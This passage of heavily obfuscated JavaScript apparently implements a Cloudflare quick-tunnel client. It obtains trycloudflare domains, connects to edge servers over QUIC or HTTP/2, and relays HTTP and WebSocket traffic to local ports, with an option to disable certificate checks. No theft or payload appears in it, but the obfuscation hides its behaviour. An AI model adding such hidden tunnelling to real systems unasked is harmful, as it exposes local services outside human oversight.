                'gvoMF': jx(0x8a9)
            };
        try {
            this[jx(0x4e3)] = await a[jx(0x548)](a0aW, this[jx(0x95a)]), this['sendHandshake']();
            const b = await a[jx(0x592)](a0aZ, this[jx(0x4e3)]);
            if (b['status'] !== 0x65) {
                this[jx(0xa8f)][jx(0x197)](this[jx(0xc99)]['stream'], a['SxkRj'](jx(0x260), b[jx(0xaa2)]), [[
                        a0b9,
                        String(b[jx(0xaa2)])
                    ]], !![]);
                try {
                    this[jx(0x4e3)][jx(0xaeb)]();
                } catch (d) {
                }
                return;
            }
            const c = [[
                    a0b9,
                    a[jx(0x26d)](String, b[jx(0xaa2)])
                ]];
            for (const [f, g] of b['headers']) {
                const h = f['toLowerCase']();
                if (a['wVNix'](h, jx(0x5ed)) || a['Tzubf'](h, 'content-length'))
                    continue;
                if (h[jx(0x830)](a[jx(0x981)]) || h[jx(0x830)](a[jx(0x571)]) || h['startsWith'](a[jx(0x5d6)]))
                    continue;
                c[jx(0x1d5)]([
                    a[jx(0xd7c)](a[jx(0x919)](a0ba, ':'), f),
                    g
                ]);
            }
            this[jx(0xa8f)]['writeResponse'](this[jx(0xc99)]['stream'], '', c, ![]), this[jx(0x88c)]()[jx(0xd7b)](() => {
            }), await this[jx(0x3c6)](b[jx(0x7e9)]);
        } catch (i) {
            this[jx(0x305)][jx(0x756)](a[jx(0x7f6)](a['CFbhl'](a[jx(0x919)](a[jx(0x8cc)], this['state'][jx(0xa1a)]['id']), a[jx(0x143)]), i)), this[jx(0xa8f)][jx(0xbc1)](this[jx(0xc99)], String(i['message'] || i), 0x1f6);
        } finally {
            this[jx(0x2e8)]();
        }
    }
    async [a0cm(0x3c6)](a) {
        const jy = a0cm;
        a[jy(0x55c)] && this[jy(0xc99)]['stream'][jy(0x10b)](a, ![]);
        for await (const b of this[jy(0x4e3)]) {
            if (this[jy(0x691)])
                break;
            this['state'][jy(0xa1a)][jy(0x10b)](b, ![]);
        }
        !this['stopped'] && this[jy(0xc99)][jy(0xa1a)][jy(0x10b)](Buffer[jy(0x2d9)](0x0), !![]);
    }
    async ['writeToOrigin']() {
        const jz = a0cm, a = {
                'czwuG': function (b, c) {
                    return b === c;
                }
            };
        while (!this[jz(0x691)]) {
            const b = await this[jz(0x99c)]();
            if (a[jz(0xa4d)](b, null)) {
                try {
                    this[jz(0x4e3)][jz(0x536)]();
                } catch (c) {
                }
                return;
            }
            try {
                this['sock'][jz(0x10b)](b);
            } catch (d) {
                this[jz(0x691)] = !![];
                return;
            }
        }
    }
    [a0cm(0x29c)]() {
        const jA = a0cm, a = {
                'VPnSE': function (i, j) {
                    return i + j;
                },
                'pxntE': function (i, j) {
                    return i + j;
                },
                'YWPlw': function (i, j) {
                    return i + j;
                },
                'DSAKa': jA(0x575),
                'auhsW': jA(0x735),
                'rdqUz': jA(0x78f),
                'lTrvN': function (i, j) {
                    return i === j;
                },
                'ovABa': jA(0xb5e),
                'PfCaa': jA(0xb0f),
                'BbkpB': jA(0x5be),
                'JVhrv': function (i, j) {
                    return i === j;
                },
                'KAHII': jA(0x5ed),
                'vRFnA': 'sec-websocket-key',
                'ByPxj': function (i, j) {
                    return i === j;
                },
                'CAbAu': jA(0x28e),
                'cLvuY': jA(0x1c2),
                'JAfRV': jA(0x796),
                'tbstA': function (i, j) {
                    return i + j;
                },
                'RatfI': jA(0x4ff),
                'jMpkD': 'base64',
                'LNqrF': jA(0xb71),
                'OMfmZ': jA(0x90c),
                'qjykm': function (i, j) {
                    return i + j;
                },
                'Avfrf': jA(0xbe0)
            }, b = new URL(this[jA(0x95a)]), c = this[jA(0x16e)][jA(0xa3d)][jA(0x830)]('/') ? this[jA(0x16e)]['path'] : a['VPnSE']('/', this[jA(0x16e)][jA(0xa3d)]), d = [a[jA(0x570)](a[jA(0x518)](a['DSAKa'], c), a['auhsW'])];
        let f = ![], g = ![], h = ![];
        for (const [i, j] of this[jA(0x16e)][jA(0x258)]) {
            const k = i['toLowerCase']();
            if (k === a['rdqUz'] || a[jA(0x430)](k, a[jA(0xa81)]) || k === a['PfCaa'] || k === a[jA(0x672)] || a[jA(0x3bc)](k, a[jA(0x9c8)]))
                continue;
            if (k === a[jA(0xd93)])
                f = !![];
            else {
                if (a[jA(0xd3f)](k, a[jA(0x1c0)]))
                    g = !![];
                else
                    k === jA(0x95a) && (h = !![]);
            }
            d['push'](a['YWPlw'](i + ':\x20', j));
        }
        d[jA(0x1d5)](a[jA(0x427)] + b['host']), !h && this[jA(0x16e)]['host'] && d[jA(0x1d5)](a[jA(0x570)](a[jA(0x516)], this[jA(0x16e)][jA(0x78f)])), !f && d[jA(0x1d5)](a[jA(0xb09)](a['RatfI'], a0k['randomBytes'](0x10)[jA(0x7a0)](a[jA(0x272)]))), !g && d[jA(0x1d5)]('Sec-WebSocket-Version:\x2013'), d['push'](a[jA(0x6b7)]), d['push'](a[jA(0xb3c)]), this[jA(0x4e3)]['write'](Buffer[jA(0x1e7)](a[jA(0x8c9)](d[jA(0x455)]('\x0d\x0a'), a[jA(0x277)]), 'latin1'));
    }
}
class a0bW {
    constructor(a, b, c, d, f, g, h) {
        const jB = a0cm;
        this['conn'] = a, this[jB(0x95a)] = b, this[jB(0x120)] = c, this[jB(0xaff)] = d, this[jB(0x6a1)] = f, this[jB(0x953)] = g, this[jB(0x305)] = h, this[jB(0x10f)] = null, this[jB(0x68e)] = new Map(), this[jB(0x2bf)] = new Set(), this['stopped'] = ![], this[jB(0xbb2)] = null, this[jB(0x7f9)] = new Promise((i, j) => {
            this['settle'] = {
                'resolve': i,
                'reject': j
            };
        }), this['conn'][jB(0x784)] = i => this[jB(0x362)](i), this[jB(0xd99)][jB(0xbb7)] = (i, j) => this[jB(0x3bd)](i, j), this['conn'][jB(0x3aa)] = i => this[jB(0xa08)](i), this[jB(0xd99)]['onClose'] = i => this[jB(0x2e8)](i);
    }
    ['run']() {
        const jC = a0cm, a = this[jC(0xd99)][jC(0x729)]();
        return this[jC(0x10f)] = new a0aV(this[jC(0xd99)], a['id'], this['log'], { 'quic': !![] }), this[jC(0x10f)][jC(0xae2)](this[jC(0x120)], this[jC(0xaff)], this[jC(0x6a1)], this[jC(0x953)]), this['done'];
    }
    [a0cm(0x2e8)](a) {
        const jD = a0cm;
        if (this['stopped'])
            return;
        this[jD(0x691)] = !![], this[jD(0x68e)][jD(0x230)]();
        for (const b of this[jD(0x2bf)]) {
            b[jD(0x2e8)]();
        }
        this[jD(0x2bf)][jD(0x230)](), a ? this[jD(0xbb2)][jD(0xae0)](a) : this[jD(0xbb2)]['resolve']();
    }
    [a0cm(0x362)](a) {
        const jE = a0cm, b = {
                'WJbLi': function (c, d) {
                    return c !== d;
                }
            };
        if (b[jE(0x8e7)](a['id'] & 0x3, 0x1))
            return;
        this[jE(0x68e)][jE(0x689)](a['id'], {
            'stream': a,
            'buffer': Buffer[jE(0x2d9)](0x0),
            'body': Buffer[jE(0x2d9)](0x0),
            'request': null,
            'websocket': ![],
            'relay': null,
            'ended': ![],
            'served': ![],
            'failed': ![]
        });
    }
    [a0cm(0x3bd)](a, b) {
        const jF = a0cm, c = {
                'NhczB': function (f, g) {
                    return f === g;
                },
                'ZIvNj': function (f, g) {
                    return f === g;
                },
                'gUTcw': function (f, g) {
                    return f !== g;
                }
            };
        if (this[jF(0x10f)] !== null && c[jF(0xdb9)](a['id'], this[jF(0x10f)][jF(0x80f)])) {
            this['control'][jF(0x41f)](b);
            return;
        }
        const d = this['requests'][jF(0x81a)](a['id']);
        if (c[jF(0xd5a)](d, undefined) || d[jF(0x3c8)])
            return;
        if (c[jF(0xdb9)](d[jF(0x16e)], null))
            d['buffer'] = Buffer[jF(0x5f9)]([
                d[jF(0x93f)],
                b
            ]), this['parseRequest'](d);
        else
            b[jF(0x55c)] && (d[jF(0x51f)] && c[jF(0x64d)](d[jF(0x61f)], null) ? d[jF(0x61f)][jF(0x41f)](b) : d['body'] = Buffer[jF(0x5f9)]([
                d[jF(0x341)],
                b
            ]));
        this['maybeServe'](d);
    }
    ['endStream'](a) {
        const jG = a0cm, b = {
                'MUJzj': function (d, f) {
                    return d !== f;
                },
                'EgkQt': function (d, f) {
                    return d === f;
                }
            };
        if (b['MUJzj'](this[jG(0x10f)], null) && b['EgkQt'](a['id'], this[jG(0x10f)][jG(0x80f)])) {
            this[jG(0x10f)]['finished'] = !![];
            return;
        }
        const c = this[jG(0x68e)]['get'](a['id']);
        if (b[jG(0x8aa)](c, undefined))
            return;
        c[jG(0xbd8)] = !![];
        if (c[jG(0x51f)] && b[jG(0x61b)](c[jG(0x61f)], null)) {
            c[jG(0x61f)]['feed'](null);
            return;
        }
        c[jG(0x16e)] !== null ? this[jG(0xbee)](c) : this[jG(0x68e)]['delete'](a['id']);
    }
    [a0cm(0xd06)](a) {
        const jH = a0cm, b = {
                'FTlRw': function (h, i) {
                    return h < i;
                },
                'ZfhKQ': function (h, i) {
                    return h + i;
                },
                'GVYoc': function (h, i) {
                    return h + i;
                },
                'tToEA': jH(0x517),
                'KCtXb': function (h, i) {
                    return h !== i;
                },
                'lmKRj': jH(0xa0b),
                'tKscQ': function (h, i) {
                    return h + i;
                },
                'DzcSH': function (h, i) {
                    return h + i;
                },
                'UWqxh': 'stream\x20',
                'zZyxX': jH(0x1b1),
                'DKjXy': function (h, i, j) {
                    return h(i, j);
                },
                'UGGGB': function (h, i) {
                    return h(i);
                },
                'IqUgM': function (h, i) {
                    return h + i;
                },
                'xUssF': jH(0x81c),
                'sQMRw': function (h, i) {
                    return h(i);
                },
                'qqWIW': function (h, i) {
                    return h === i;
                },
                'AoQQZ': function (h, i) {
                    return h(i);
                }
            }, c = a[jH(0x93f)];
        if (b[jH(0x915)](c[jH(0x55c)], a0b4['length']))
            return;
        if (!c['subarray'](0x0, a0b2[jH(0x55c)])['equals'](a0b2)) {
            this[jH(0x305)][jH(0x756)](b[jH(0x44f)](b[jH(0x9fb)]('stream\x20', a['stream']['id']), b['tToEA'])), a[jH(0x3c8)] = !![];
            return;
        }
        if (b[jH(0x24f)](c[jH(0x262)](0x6, 0x8)[jH(0x7a0)](b[jH(0x368)]), '01')) {
            this['log'][jH(0x756)](b['tKscQ'](b['DzcSH'](b[jH(0x9fb)](b[jH(0x20e)], a[jH(0xa1a)]['id']), b['zZyxX']), c['subarray'](0x6, 0x8)[jH(0x7a0)](b[jH(0x368)]))), a[jH(0x3c8)] = !![];
            return;
        }
        const [d, f] = b[jH(0xa7e)](a0aE, c['subarray'](a0b4[jH(0x55c)]), 0x1);
        if (!d[jH(0x55c)])
            return;
        let g;
        try {
            g = b[jH(0x6cc)](a0aK, d[0x0]);
        } catch (h) {
            this[jH(0x305)][jH(0x756)](b[jH(0x2c5)](b[jH(0xb9f)](b[jH(0x48b)](b[jH(0x20e)], a['stream']['id']), b['xUssF']), h)), a[jH(0x3c8)] = !![];
            return;
        }
        a[jH(0x341)] = f, a[jH(0x93f)] = Buffer[jH(0x2d9)](0x0);
        try {
            a[jH(0x16e)] = b['sQMRw'](a0bT, g), b['qqWIW'](a[jH(0x16e)][jH(0x483)], a0b6[jH(0x51f)]) && (a[jH(0x51f)] = !![]);
        } catch (i) {
            this['log'][jH(0x756)](b[jH(0x2c5)](b[jH(0xb9f)](b[jH(0x20e)], a[jH(0xa1a)]['id']) + ':\x20', i)), a[jH(0x3c8)] = !![], this[jH(0xbc1)](a, b[jH(0x142)](String, i[jH(0xbe8)] || i), 0x1f6);
        }
    }
    ['maybeServe'](a) {
        const jI = a0cm;
        if (a[jI(0x31a)] || a['request'] === null || a[jI(0x3c8)] || !a0bU(a))
            return;
        a[jI(0x31a)] = !![], this[jI(0x32c)](a);
    }
    async ['serveRequest'](a) {
        const jJ = a0cm, b = {
                'stZEn': function (f, g) {
                    return f !== g;
                },
                'nKryV': function (f, g) {
                    return f + g;
                },
                'WQyTX': function (f, g) {
                    return f + g;
                },
                'ETqGi': jJ(0x8b0),
                'Plvms': '\x20is\x20not\x20proxied\x20over\x20QUIC\x20yet',
                'ntWUk': function (f, g, h, i, j, k) {
                    return f(g, h, i, j, k);
                },
                'GSbeU': function (f, g) {
                    return f === g;
                },
                'PXQmZ': jJ(0x5ed),
                'BmnSY': function (f, g) {
                    return f === g;
                },
                'mgQLH': jJ(0x9bd),
                'Shmrn': function (f, g) {
                    return f(g);
                },
                'unYGk': ':Content-Type',
                'uhhXO': function (f, g) {
                    return f + g;
                },
                'vXpuf': jJ(0x9b9),
                'KuGfe': jJ(0xf7),
                'SRFEN': function (f, g) {
                    return f(g);
                }
            }, c = a[jJ(0xa1a)], d = a[jJ(0x16e)];
        try {
            if (d[jJ(0x483)] === a0b6[jJ(0x51f)]) {
                this[jJ(0xd37)](a);
                return;
            }
            if (b[jJ(0x7c0)](d[jJ(0x483)], a0b6[jJ(0x6c5)]))
                throw new Error(b[jJ(0xab3)](b[jJ(0x4f9)](b['ETqGi'], d[jJ(0x483)]), b[jJ(0x133)]));
            const f = await b[jJ(0x4a3)](a0aY, this[jJ(0x95a)], d[jJ(0x394)], d[jJ(0xa3d)], d[jJ(0x258)], a[jJ(0x341)]), g = [[
                        a0b9,
                        String(f[jJ(0xaa2)] === 0x65 ? 0xc8 : f[jJ(0xaa2)])
                    ]];
            let h = ![];
            for (const [i, j] of f[jJ(0x258)]) {
                const k = i[jJ(0x426)]();
                if (b[jJ(0xbf3)](k, b[jJ(0x819)]))
                    continue;
                b[jJ(0x381)](k, b[jJ(0xac0)]) && (h = !![]), g[jJ(0x1d5)]([
                    b[jJ(0xab3)](a0ba + ':', i),
                    j
                ]);
            }
            if (!h) {
                const l = b[jJ(0x9b3)](a0aN, d[jJ(0xa3d)]);
                l && g[jJ(0x1d5)]([
                    a0ba + b['unYGk'],
                    l
                ]);
            }
            this[jJ(0x197)](c, '', g, ![]);
            for await (const m of f[jJ(0x341)]) {
                c[jJ(0x10b)](m, ![]);
            }
            c[jJ(0x10b)](Buffer['alloc'](0x0), !![]);
        } catch (n) {
            this[jJ(0x305)][jJ(0x756)](b[jJ(0x4f9)](b[jJ(0x212)](b[jJ(0xac7)], c['id']) + b[jJ(0x556)], n)), this[jJ(0xbc1)](a, b[jJ(0x559)](String, n[jJ(0xbe8)] || n), 0x1f6);
        } finally {
            !a[jJ(0x51f)] && this[jJ(0x68e)]['delete'](c['id']);
        }
    }
    [a0cm(0xd37)](a) {
        const jK = a0cm, b = new a0bV(this, a, a[jK(0x16e)], this[jK(0x95a)], this[jK(0x305)]);
        a[jK(0x61f)] = b, this[jK(0x2bf)][jK(0x1d9)](b), a[jK(0x341)][jK(0x55c)] && (b[jK(0x41f)](a['body']), a[jK(0x341)] = Buffer[jK(0x2d9)](0x0)), b[jK(0x6fd)]()[jK(0xd7b)](() => {
        })[jK(0x4a1)](() => {
            const jL = jK;
            this[jL(0x2bf)][jL(0xcfe)](b), this[jL(0x68e)][jL(0xcfe)](a[jL(0xa1a)]['id']);
        });
    }
    [a0cm(0xbc1)](a, b, c) {
        const jM = a0cm, d = {
                'SbsYY': function (f, g) {
                    return f(g);
                }
            };
        this['writeResponse'](a[jM(0xa1a)], b, [[
                a0b9,
                d[jM(0x76a)](String, c)
            ]], !![]);
    }
    [a0cm(0x197)](a, b, c, d) {
        const jN = a0cm, f = {
                'wHlSp': function (g, h, i) {
                    return g(h, i);
                }
            };
        if (this[jN(0x691)] || a[jN(0x77d)][jN(0xad1)])
            return;
        a[jN(0x10b)](Buffer[jN(0x5f9)]([
            a0b4,
            f[jN(0x159)](a0aL, b, c)
        ]), d);
    }
}
async function a0bX(a, b, c) {
    const jO = a0cm, d = {
            'PWPsC': function (h, i) {
                return h === i;
            },
            'fgtKd': function (h, i) {
                return h + i;
            },
            'oeVmE': function (h, i) {
                return h + i;
            },
            'lWGyu': function (h, i) {
                return h + i;
            },
            'YiHZi': function (h, i) {
                return h + i;
            },
            'BHdit': jO(0x708),
            'SSugd': function (h, i) {
                return h + i;
            },
            'jPaOU': jO(0xcbe),
            'qPFXC': jO(0xc17),
            'juJZK': jO(0xc43)
        }, f = a0ak['slice']()[jO(0x234)](() => Math[jO(0xcfd)]() - 0.5);
    let g = null;
    for (const h of f) {
        const i = new a0bR({
            'logger': a,
            'host': h,
            'port': a0al,
            'serverName': a0bd,
            'alpn': a0bc,
            'idleTimeout': d[jO(0xcd7)](b, undefined) ? 0x7530 : b,
            'verifyCertificate': c === !![]
        });
        try {
            return await i[jO(0x795)](), a['info'](d[jO(0x386)](d[jO(0xf2)](d['lWGyu'](d['YiHZi'](d[jO(0x473)], h), ':'), a0al), '\x20over\x20QUIC')), i;
        } catch (j) {
            g = j, a[jO(0x756)](d[jO(0x9a1)](d['YiHZi'](d[jO(0xd87)] + h, jO(0x8a9)), j[jO(0xbe8)]));
            try {
                i[jO(0x7bc)](d[jO(0xfd)]);
            } catch (k) {
            }
        }
    }
    throw new Error(d[jO(0xf2)](d[jO(0x697)], g));
}
const a0bY = 0x2;
function a0bZ(a, b, c) {
    const jP = a0cm, d = {
            'Xhnpl': function (g, h, i) {
                return g(h, i);
            },
            'lYhHC': function (g, h) {
                return g < h;
            }
        }, f = d['Xhnpl'](parseInt, process.env[a] || '', 0xa);
    if (!Number[jP(0x53b)](f) || d[jP(0x6e0)](f, c))
        return b;
    return f;
}
const a0c0 = a0bZ(a0cm(0x280), 0x5, 0x2), a0c1 = 0x1e, a0c2 = a0bZ(a0cm(0x9fd), 0x2, 0x1), a0c3 = a0bZ('KISAMA_ARGO_RETRY_MAX_SECONDS', 0x12c, 0x3c);
function a0c4(a) {
    const jQ = a0cm, b = {
            'PodEE': function (d, f) {
                return d <= f;
            },
            'xhxaW': function (d, f) {
                return d - f;
            },
            'TYKxs': function (d, f) {
                return d * f;
            }
        };
    if (b[jQ(0x59d)](a, 0x0))
        return a0c2;
    const c = Math[jQ(0x389)](b[jQ(0x512)](a, 0x1), 0xa);
    return Math[jQ(0x389)](b[jQ(0xd14)](a0c2, 0x2 ** c), a0c3);
}
function a0c5(a, b = 0x12c) {
    const jR = a0cm, c = {
            'siaMD': function (d, f) {
                return d == f;
            },
            'sPJSk': function (d, f) {
                return d(f);
            }
        };
    if (c[jR(0x48f)](a, null))
        return null;
    return c[jR(0x1e5)](String, a)[jR(0x2d5)](0x0, b);
}
function a0c6() {
    const jS = a0cm;
    return new Date()[jS(0x213)]()[jS(0x3a0)](/\.\d{3}Z$/, 'Z');
}
const a0c7 = ((() => {
    const jT = a0cm, a = {
            'LQEcW': function (c, d, f) {
                return c(d, f);
            },
            'aXoro': function (c, d) {
                return c === d;
            },
            'CUgIU': function (c, d) {
                return c * d;
            }
        }, b = a[jT(0x573)](parseInt, process.env.KISAMA_ARGO_IDLE_TIMEOUT || '', 0xa);
    if (!Number[jT(0x53b)](b) || b < 0x0)
        return 0x12c * 0x3e8;
    return a['aXoro'](b, 0x0) ? 0x0 : a['CUgIU'](Math['max'](b, 0xa), 0x3e8);
})());
function a0c8(a) {
    const jU = a0cm, b = {
            'Bpuie': function (c, d) {
                return c === d;
            },
            'LplOw': jU(0x66d)
        };
    if (typeof a === 'string') {
        const c = a[jU(0x58a)]();
        if (c)
            try {
                return JSON[jU(0x881)](c);
            } catch (d) {
            }
        return {};
    }
    return a && b[jU(0xd9f)](typeof a, b[jU(0x311)]) ? a : {};
}
class a0c9 {
    constructor(a) {
        const jV = a0cm, b = { 'TREYA': '1|4|3|2|0' }, c = b[jV(0x685)][jV(0xb0c)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                this[jV(0xa78)] = a0aT;
                continue;
            case '1':
                this[jV(0x305)] = a;
                continue;
            case '2':
                this[jV(0xc90)] = a0b1;
                continue;
            case '3':
                this[jV(0x15a)] = null;
                continue;
            case '4':
                this[jV(0xa71)] = new Map();
                continue;
            }
            break;
        }
    }
    async [a0cm(0x74a)](a, b, c = ![]) {
        const jW = a0cm, d = {
                'hNJiy': function (m, n) {
                    return m + n;
                },
                'QohsF': function (m, n) {
                    return m + n;
                },
                'NJSsn': jW(0x1f4),
                'KNHoH': jW(0x947),
                'uXTwX': jW(0x3c8),
                'hmljt': function (m, n) {
                    return m(n);
                },
                'aAqjg': function (m) {
                    return m();
                },
                'RioEq': function (m, n) {
                    return m > n;
                },
                'PMHHb': 'https://api.trycloudflare.com',
                'scOKf': jW(0x201),
                'ZIXXQ': jW(0x2c2),
                'fMakz': 'alive',
                'vJfTW': function (m, n) {
                    return m + n;
                },
                'wYPDk': function (m, n) {
                    return m + n;
                },
                'RKXpj': function (m, n) {
                    return m + n;
                },
                'INNoF': jW(0x7c3),
                'bNgKN': '\x20->\x20127.0.0.1:'
            }, f = this['tunnels'][jW(0x81a)](a) || [];
        if (d[jW(0xfc)](f[jW(0x55c)], 0x0) && !b) {
            const m = new Error(jW(0xc31) + a + jW(0xbc4));
            m[jW(0xaa2)] = 0x199, m['port'] = a;
            throw m;
        }
        let g, h, i, j;
        try {
            [g, h, i, j] = await (this[jW(0x852)] || a0aQ)(d['PMHHb']);
        } catch (n) {
            const o = new Error(jW(0x955) + n['message']);
            o['status'] = 0x1f4, o[jW(0x597)] = a;
            throw o;
        }
        const k = g['startsWith'](d[jW(0x356)]) ? g : d[jW(0xbff)](d[jW(0x356)], g), l = {
                'tunnelDomain': k,
                'port': a,
                'createdAt': new Date()[jW(0x213)]()[jW(0x3a0)](/\.\d{3}Z$/, 'Z'),
                'transport': c ? d[jW(0x285)] : 'h2',
                'quicFailures': 0x0,
                'consecutiveFailures': 0x0,
                'status': d[jW(0xaf6)],
                'lastError': null,
                'lastErrorAt': null,
                'lastRegisteredAt': new Date()[jW(0x213)]()['replace'](/\.\d{3}Z$/, 'Z'),
                'stopped': ![],
                'sock': null,
                'conn': null,
                'runPromise': null
            };
        return l[jW(0x23d)] = this[jW(0x960)](l, h, i, j)[jW(0xd7b)](p => {
            const jX = jW;
            this['log'][jX(0x756)](d[jX(0x749)](d[jX(0x749)](d[jX(0xbff)](d[jX(0x320)], k), d[jX(0x5f4)]), p[jX(0xbe8)])), !l[jX(0x691)] && (l['status'] = d['uXTwX'], l[jX(0x8ff)] = d[jX(0x9f7)](a0c5, p && p['message'] ? p[jX(0xbe8)] : p), l['lastErrorAt'] = d[jX(0xa89)](a0c6));
        }), f[jW(0x1d5)](l), this[jW(0xa71)]['set'](a, f), this[jW(0x305)][jW(0xd42)](d[jW(0x623)](d[jW(0x623)](d[jW(0x28d)](d[jW(0x28d)](d[jW(0x869)](d[jW(0x95c)], k), d[jW(0xcf2)]), a), '\x20('), l[jW(0xcf7)]) + ')'), l;
    }
    [a0cm(0x290)]() {
        const jY = a0cm, a = [], b = [...this[jY(0xa71)]['keys']()][jY(0x234)]((c, d) => c - d);
        for (const c of b) {
            for (const d of this[jY(0xa71)][jY(0x81a)](c)) {
                a[jY(0x1d5)]({
                    'tunnel_domain': d['tunnelDomain'],
                    'port': d[jY(0x597)],
                    'created_at': d[jY(0x87a)],
                    'transport': d[jY(0xcf7)],
                    'status': d[jY(0xaa2)] || 'alive',
                    'last_error': d[jY(0x8ff)] ?? null,
                    'last_error_at': d[jY(0x2fd)] ?? null,
                    'consecutive_failures': d[jY(0x539)] || 0x0,
                    'last_registered_at': d['lastRegisteredAt'] ?? null
                });
            }
        }
        return a;
    }
    async [a0cm(0xb88)](a, b) {
        const jZ = a0cm, c = {
                'GJXbV': function (i, j) {
                    return i === j;
                },
                'XiOBk': jZ(0x7f2),
                'CHNCt': function (i, j) {
                    return i !== j;
                },
                'HoJjl': 'tunnel\x20removed',
                'lRrXX': function (i, j) {
                    return i !== j;
                },
                'FBcNI': jZ(0x9f2),
                'SKmUL': function (i, j) {
                    return i > j;
                },
                'jpVgu': function (i, j) {
                    return i + j;
                }
            }, d = this[jZ(0xa71)][jZ(0x81a)](a) || [];
        if (d[jZ(0x55c)] === 0x0)
            return {
                'status': 0x194,
                'message': 'no\x20tunnel\x20found\x20on\x20port\x20' + a
            };
        let f;
        if (b === undefined || b === null || b === '') {
            if (d[jZ(0x55c)] > 0x1)
                return {
                    'status': 0x199,
                    'message': 'multiple\x20tunnels\x20exist\x20on\x20port\x20' + a + ',\x20specify\x20tunnel_domain\x20to\x20disambiguate'
                };
            f = d;
        } else {
            f = d[jZ(0x88f)](i => i['tunnelDomain'] === b);
            if (c[jZ(0xc82)](f[jZ(0x55c)], 0x0))
                return {
                    'status': 0x194,
                    'message': jZ(0xbd1) + a + '\x20with\x20domain\x20' + b
                };
        }
        const g = [];
        for (const i of f) {
            const j = c[jZ(0x719)][jZ(0xb0c)]('|');
            let k = 0x0;
            while (!![]) {
                switch (j[k++]) {
                case '0':
                    i['stopped'] = !![];
                    continue;
                case '1':
                    await i[jZ(0x23d)][jZ(0xd7b)](() => {
                    });
                    continue;
                case '2':
                    if (c[jZ(0xc9c)](i[jZ(0xd99)], null))
                        try {
                            i[jZ(0xd99)][jZ(0x7bc)](c['HoJjl']);
                        } catch (l) {
                        }
                    continue;
                case '3':
                    if (c[jZ(0x106)](i[jZ(0x4e3)], null))
                        try {
                            i['sock'][jZ(0xaeb)]();
                        } catch (m) {
                        }
                    continue;
                case '4':
                    g[jZ(0x1d5)]({
                        'tunnel_domain': i[jZ(0x4a6)],
                        'port': i['port'],
                        'created_at': i['createdAt'],
                        'transport': i[jZ(0xcf7)],
                        'status': i[jZ(0xaa2)] || c['FBcNI'],
                        'last_error': i[jZ(0x8ff)] ?? null,
                        'last_error_at': i[jZ(0x2fd)] ?? null,
                        'consecutive_failures': i[jZ(0x539)] || 0x0,
                        'last_registered_at': i['lastRegisteredAt'] ?? null
                    });
                    continue;
                }
                break;
            }
        }
        const h = d[jZ(0x88f)](n => !n['stopped']);
        c[jZ(0xd5e)](h[jZ(0x55c)], 0x0) ? this[jZ(0xa71)][jZ(0x689)](a, h) : this['tunnels'][jZ(0xcfe)](a);
        for (const n of g) {
            this[jZ(0x305)]['info'](c['jpVgu'](jZ(0x45c), n[jZ(0x534)]));
        }
        return {
            'status': 'ok',
            'deleted': g[jZ(0x55c)],
            'tunnels': g
        };
    }
    async [a0cm(0x960)](a, b, c, d) {
        const k0 = a0cm, f = {
                'EyqVy': function (j, k) {
                    return j < k;
                },
                'aKPGs': k0(0x74b),
                'rMGEQ': function (j, k) {
                    return j !== k;
                },
                'XSUku': function (j, k) {
                    return j(k);
                },
                'sJBSi': k0(0x9ac),
                'UtnQo': function (j, k) {
                    return j === k;
                },
                'gEIoT': k0(0x2c2),
                'EWpMV': function (j, k, l, m) {
                    return j(k, l, m);
                },
                'LvsqK': function (j, k) {
                    return j > k;
                },
                'qJAGc': k0(0x244),
                'tvwlL': function (j, k) {
                    return j % k;
                },
                'QFJww': function (j, k) {
                    return j + k;
                },
                'ZWRUW': function (j, k) {
                    return j + k;
                },
                'SjdzI': function (j, k) {
                    return j + k;
                },
                'ZpvfZ': 'argo\x20tunnel\x20',
                'JOmkE': k0(0x3c8),
                'OsAuL': k0(0xb65),
                'SmrLn': function (j, k) {
                    return j !== k;
                },
                'vvuwJ': k0(0xc23),
                'gkCYy': function (j) {
                    return j();
                },
                'rjWLs': k0(0x9f2),
                'nNvkW': function (j, k) {
                    return j >= k;
                },
                'TehWi': k0(0x58b),
                'XLfwY': 'tunnel\x20re-register\x20failed',
                'bJsdJ': function (j, k) {
                    return j(k);
                },
                'ghtbn': function (j, k) {
                    return j * k;
                },
                'eWYIH': function (j, k) {
                    return j * k;
                },
                'JOLqE': function (j, k) {
                    return j(k);
                }
            }, g = f[k0(0x8f6)] + a['port'], h = async j => {
                const k1 = k0;
                for (let k = 0x0; f[k1(0x5d5)](k, j) && !a[k1(0x691)]; k += 0x1f4) {
                    await new Promise(l => setTimeout(l, Math['min'](0x1f4, j - k)));
                }
            };
        a[k0(0x539)] = 0x0;
        let i = 0x0;
        while (!a[k0(0x691)]) {
            let j = null, k = null, l = null;
            try {
                const n = f[k0(0x67b)](f['XSUku'](String, process.env.KISAMA_EDGE_INSECURE || '')[k0(0x426)](), f[k0(0x273)]);
                if (f[k0(0xc64)](a[k0(0xcf7)], f[k0(0x75e)])) {
                    l = await f['EWpMV'](a0bX, this[k0(0x305)], f[k0(0x170)](a0c7, 0x0) ? a0c7 : 0x7530, n);
                    if (a[k0(0x691)]) {
                        try {
                            l[k0(0x7bc)](f[k0(0x55e)]);
                        } catch (o) {
                        }
                        break;
                    }
                    a[k0(0xd99)] = l, i = f['tvwlL'](f['QFJww'](i, 0x1), 0x4), await new a0bW(l, g, b, c, d, i, this[k0(0x305)])[k0(0x6fd)]();
                } else {
                    j = await this[k0(0xc90)](n, this[k0(0x305)]);
                    if (a[k0(0x691)]) {
                        try {
                            j[k0(0xaeb)]();
                        } catch (p) {
                        }
                        break;
                    }
                    a['sock'] = j, i = (i + 0x1) % 0x4, k = new this['_H2Connection'](j, g, b, c, d, i, this['log'], a['tunnelDomain'], ![], { 'printed': !![] }), await k[k0(0x6fd)]();
                }
            } catch (q) {
                if (!a[k0(0x691)]) {
                    this[k0(0x305)]['warning'](f[k0(0x32e)](f[k0(0x7a2)](f[k0(0xa32)](f['ZpvfZ'], a[k0(0x4a6)]), k0(0x765)), q[k0(0xbe8)]));
                    if (a['status'] !== f[k0(0x17a)])
                        a['status'] = f[k0(0x2be)];
                    a[k0(0x8ff)] = a0c5(q && q['message'] ? q['message'] : q), a[k0(0x2fd)] = a0c6();
                }
            } finally {
                if (j !== null)
                    try {
                        j['destroy']();
                    } catch (r) {
                    }
                if (f[k0(0x94e)](l, null))
                    try {
                        l['close'](k0(0x7e4));
                    } catch (s) {
                    }
                a[k0(0x4e3)] = null, a[k0(0xd99)] = null;
            }
            if (a[k0(0x691)])
                break;
